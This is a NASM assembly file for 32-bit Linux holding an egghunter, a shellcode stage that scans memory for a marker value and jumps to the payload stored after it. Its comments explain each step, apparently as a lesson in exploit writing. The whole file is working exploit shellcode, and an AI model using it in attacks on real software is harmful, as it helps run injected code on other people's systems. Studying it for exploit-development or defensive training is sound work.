; Filename: egg-hunt.nasm

global _start			

section .text
_start:	

	; register initilization 
	xor ecx, ecx 		; zero out ecx register
	mul ecx 			; zero out both eax and edx 
	mov ebx, 0x40904090 ; move egg (token) to ebx register in reverse order

page_alignment:
	or dx, 0xfff 		; align page, same as add dx, 4095 (PAGE_SIZE)
align_byte:
	inc edx 			; next memory segment (next address in current page)
	pusha 				; save all registers state on the stack (preserve state accross syscall)

	; accessing the memory offset 
	; int access (const char * pathname, int mode); 
	; access (memoryaddress, 0)

	lea ebx, [edx+0x4]  ; alignment to validate the last four bytes of the register 
	mov al, 0x21		; syscall number 0x21 for access 
	int 0x80            ; Kernel interrupt

	; verifies if memory is not readable (bad address = EFAULT = 0xf2 = -14)
	; as the offset is not from a path name, access will never result 0, so we have to compare the error result with 0xf2
	cmp al, 0xf2		
	popa				; pop all values on stack onto registers (reverse pusha)

	jz page_alignment 	; if not loop

	cmp [edx], ebx		; Compare content of pointer supplied in EDX against the egg in EBX 
	jnz align_byte		; if not loop
	cmp [edx+0x4], ebx	; compare the content in edx+4 with the egg in EBX 
	jnz align_byte 		; if not equal, loop
	jmp edx 			; if is equal, eat the egg 